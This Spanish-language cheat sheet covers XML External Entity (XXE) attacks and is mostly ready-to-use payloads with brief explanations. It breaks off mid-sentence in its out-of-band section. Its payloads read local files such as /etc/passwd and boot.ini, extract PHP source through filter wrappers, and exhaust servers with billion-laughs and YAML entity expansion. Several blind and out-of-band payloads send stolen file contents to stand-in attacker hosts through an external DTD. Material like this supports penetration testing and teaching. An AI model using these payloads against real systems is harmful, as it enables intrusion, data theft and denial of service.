# XXE (XML External Entity) - Ataques y Explotación

Un **ataque XXE (XML External Entity)** es un tipo de vulnerabilidad en aplicaciones que procesan entradas XML, donde un atacante puede manipular las entidades externas para acceder a archivos locales, realizar ataques DoS o incluso ejecutar código remoto.

---

## 🔍 ¿Qué es una Entidad Externa (XXE)?

Una **entidad externa** en XML permite incluir datos desde fuentes externas mediante la declaración `SYSTEM` o `PUBLIC`. Si la aplicación no valida correctamente estas entidades, un atacante puede abusar de ellas para:

- Leer archivos locales (`file://`)
- Realizar consultas a servicios internos
- Ejecutar ataques de denegación de servicio (DoS)
- Exfiltrar datos a servidores externos

---

## 🚨 Tipos de Ataques XXE

### 1️⃣ **Prueba Básica (Basic Test)**

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```
🔹 **Objetivo**: Incluir una entidad estática para probar la vulnerabilidad.

---

### 2️⃣ **XXE Clásico (Classic XXE)**

#### 📌 Lectura de archivos locales (Linux/Unix)
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

#### 📌 Lectura de archivos locales (Windows)
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >
]>
<foo>&xxe;</foo>
```

#### 📌 XXE con codificación Base64
```xml
<!DOCTYPE test [
  <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk">
  %init;
]>
<foo/>
```

---

### 3️⃣ **XXE con Wrappers PHP**

#### 📌 Extracción de código PHP (Base64)
```xml
<!DOCTYPE replace [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
    <phone>00 11 22 33 44</phone>
    <adress>42 rue du CTF</adress>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>
```

#### 📌 Error tipográfico en wrapper PHP (DoS potencial)
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY % xxe SYSTEM "php://filter/convert.bae64-encode/resource=http://10.0.0.3" >
]>
<foo>&xxe;</foo>
```
⚠️ **Nota**: `convert.bae64-encode` es incorrecto (debería ser `base64-encode`).

---

## 💥 Ataques de Denegación de Servicio (DoS)

### 1️⃣ **Billion Laughs Attack (Entidades Recursivas)**
```xml
<!DOCTYPE data [
  <!ENTITY a0 "dos" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
🔹 **Efecto**: Consume recursos del servidor al expandir entidades recursivamente.

### 2️⃣ **Ataque YAML (Variante)**
```yaml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
🔹 **Efecto**: Similar al Billion Laughs, pero usando sintaxis YAML.

---

## 🕵️‍♂️ XXE Ciego (Blind XXE)

### 1️⃣ **XXE Ciego Básico**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY % xxe SYSTEM "file:///etc/passwd" >
  <!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
]>
<foo>&callhome;</foo>
```
🔹 **Mecanismo**: El atacante recibe los datos en su servidor (`www.malicious.com`).

### 2️⃣ **XXE OOB (Out-of-Band) - Yunusov (2013)**
#### 📌 XML principal
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://publicServer.com/parameterEntity_oob.dtd">
<data>&send;</data>
```

#### 📌 DTD en servidor externo (`http://publicServer.com/parameterEntity_oob.dtd`)
```xml
<!ENTITY % file SYSTEM "file:///sys/power/image_size">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://publicServer.com/?%file;'>">
%all;
```
🔹 **Mecanismo**: El servidor víctima hace una solicitud a
